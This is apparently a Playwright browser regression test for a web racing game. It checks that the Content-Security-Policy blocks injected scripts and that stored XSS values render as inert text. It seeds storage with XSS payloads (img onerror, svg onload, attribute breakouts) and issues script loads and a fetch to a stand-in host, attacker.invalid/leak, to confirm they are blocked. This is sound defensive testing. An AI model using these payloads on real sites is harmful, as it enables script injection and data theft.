'use strict';
// Regressioni nel browser reale: CSP, payload persistenti, HTTP e apertura file locale.
const assert=require('node:assert/strict'),path=require('node:path'),{pathToFileURL}=require('node:url');
const {chromium}=require('playwright'),{createGameServer}=require('../server/server.cjs');
(async()=>{
 const server=createGameServer({log:()=>{}});await new Promise(resolve=>server.listen(0,'127.0.0.1',resolve));
 const origin='http://127.0.0.1:'+server.address().port;
 let browser;
 try{
  browser=await chromium.launch({channel:process.env.F1_BROWSER_CHANNEL||'msedge',headless:true});
  const context=await browser.newContext({viewport:{width:1280,height:900}}),page=await context.newPage(),errors=[];
  let externalNetwork=0;await context.route('https://attacker.invalid/**',route=>{externalNetwork++;return route.abort();});
  page.on('pageerror',error=>errors.push(error.message));
  await page.addInitScript(()=>{
   window.requestAnimationFrame=()=>0;
   localStorage.setItem('f1sim.set',JSON.stringify({vol:0,myIdentityReady:true,myTeamNameReady:true,
    my:{driver:'<img src=x onerror="globalThis.pwned=1">',name:'<svg/onload=alert(1)>',code:'<X>',num:42,
     c1:'#ffffff" onmouseover="globalThis.pwned=1',c2:'url(https://attacker.invalid/leak)'},sens:'Infinity'}));
   localStorage.setItem('f1sim.rec',JSON.stringify([{d:'<img src=x onerror="globalThis.pwned=1">',circuitName:'<svg/onload=alert(1)>',pos:1,tot:123,best:33},
    {d:'injected',pos:'<img src=x onerror="globalThis.pwned=1">',tot:1,best:1}]));
   document.addEventListener('securitypolicyviolation',e=>{(globalThis.violations??=[]).push(e.effectiveDirective);});
  });
  const response=await page.goto(origin);assert.equal(response.status(),200);
  assert.match(response.headers()['content-security-policy'],/frame-ancestors 'none'/);
  await page.evaluate(()=>render());assert.ok(await page.locator('#menuBackdrop').isVisible());
  await page.locator('#menu [data-go="records"]').click();assert.equal(await page.locator('#recList > div').count(),1);
  assert.equal(await page.locator('#recList img, #recList svg, #recList script').count(),0);
  assert.match(await page.locator('#recList').textContent(),/<img/);
  await page.locator('#records [data-go="menu"]').click();
  await page.locator('#menu [data-go="paddock"]').click();assert.equal(await page.locator('.paddock-team').count(),11);
  await page.locator('#paddock [data-go="menu"]').click();
  await page.locator('#menu [data-go="cars"]').click();
  await page.locator('[data-my="c1"]').fill('#123456');assert.equal(await page.evaluate(()=>S.my.c1),'#123456');
  await page.locator('#cars [data-go="menu"]').click();
  await page.locator('#menu [data-go="circuits"]').click();assert.equal(await page.locator('.circuit-card').count(),24);
  assert.deepEqual(await page.evaluate(()=>globalThis.violations||[]),[],'game generated a CSP violation');
  await page.evaluate(()=>{S.qualiEnabled=false;startRace();state='racing';pl.go=true;pl.ai=true;for(let i=0;i<400;i++)update(.05);hudUpdate(1);render();});
  assert.equal(await page.evaluate(()=>cars.every(c=>Number.isFinite(c.x)&&Number.isFinite(c.y))),true);
  assert.equal(await page.locator('#tower img, #tower svg, #tower script').count(),0);
  assert.equal(await page.evaluate(()=>globalThis.pwned),undefined);
  // Verifica le policy tramite normali nodi DOM, senza disabilitare la CSP.
  await page.evaluate(()=>{
   const script=document.createElement('script');script.textContent='globalThis.inlineRan=true';document.body.append(script);
   const external=document.createElement('script');external.src='https://attacker.invalid/payload.js';document.body.append(external);
   const image=document.createElement('img');image.setAttribute('onerror','globalThis.handlerRan=true');image.src='data:bad';document.body.append(image);
   fetch('https://attacker.invalid/leak').catch(()=>{});
  });
  await page.waitForFunction(()=>['script-src-elem','script-src-attr','connect-src'].every(d=>(globalThis.violations||[]).includes(d)));
  assert.equal(await page.evaluate(()=>globalThis.inlineRan||globalThis.handlerRan||globalThis.pwned),undefined);
  assert.equal(externalNetwork,0,'CSP must block the request before network interception');
  assert.deepEqual(errors,[]);
  const offline=await browser.newPage();const offlineErrors=[];offline.on('pageerror',e=>offlineErrors.push(e.message));
  await offline.addInitScript(()=>{window.requestAnimationFrame=()=>0;});
  await offline.goto(pathToFileURL(path.join(__dirname,'../index.html')).href);
  await offline.evaluate(()=>{S.vol=0;mkCars();render();});assert.equal(await offline.evaluate(()=>cars.length),23);assert.deepEqual(offlineErrors,[]);
  console.log('Browser security: payload persistenti neutralizzati, CSP verificata, menu/circuiti/gara e file:// funzionanti.');
 }finally{if(browser)await browser.close();await new Promise(resolve=>{server.closeAllConnections();server.close(resolve);});}
})().catch(error=>{console.error(error);process.exitCode=1;});
